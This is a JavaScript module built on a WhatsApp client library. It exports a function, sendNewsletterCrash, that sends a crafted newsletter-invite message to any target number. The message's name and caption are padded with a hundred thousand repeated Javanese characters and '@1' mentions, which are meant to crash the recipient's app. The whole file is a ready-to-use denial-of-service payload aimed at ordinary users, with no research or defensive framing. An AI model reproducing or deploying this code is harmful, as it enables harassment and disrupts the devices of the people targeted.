import { generateWAMessageFromContent } from '@nexustechpro/baileys';
import crypto from "crypto"
import chalk from "chalk";
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function sendNewsletterCrash(sock, targetJid) {
  try {
    console.log(chalk.cyan(`[Newsletter Crash] Preparing to send to ${targetJid}...`));
    
    const crashText = "K? | `impõssible. 🦠 ‣—" + "ꦾ".repeat(100000) + "@1".repeat(100000);
    
    const newsletterMessage = {
      viewOnceMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "333333333333333333@newsletter",
            newsletterName: crashText,
            jpegThumbnail: "",
            caption: crashText,
            inviteExpiration: Date.now() + 1814400000
          }
        }
      }
    };
    
    console.log(chalk.yellow(`[Newsletter Crash] Generating message content...`));
    
    const generatedMsg = await generateWAMessageFromContent(
      targetJid,
      newsletterMessage,
      {
        userJid: sock.user.id,
        timestamp: new Date()
      }
    );
    
    console.log(chalk.yellow(`[Newsletter Crash] Relaying message...`));
    
    await sock.relayMessage(targetJid, generatedMsg.message, {
      messageId: generatedMsg.key.id
    });
    
    console.log(chalk.green(`[Newsletter Crash] ✓ Successfully sent to ${targetJid}`));
    
  } catch (error) {
    console.log(chalk.red(`[Newsletter Crash] ✗ Failed to send to ${targetJid}`));
    console.log(chalk.red(`[Newsletter Crash] Error: ${error.message}`));
    throw error;
  }
}


export {
 sendNewsletterCrash
};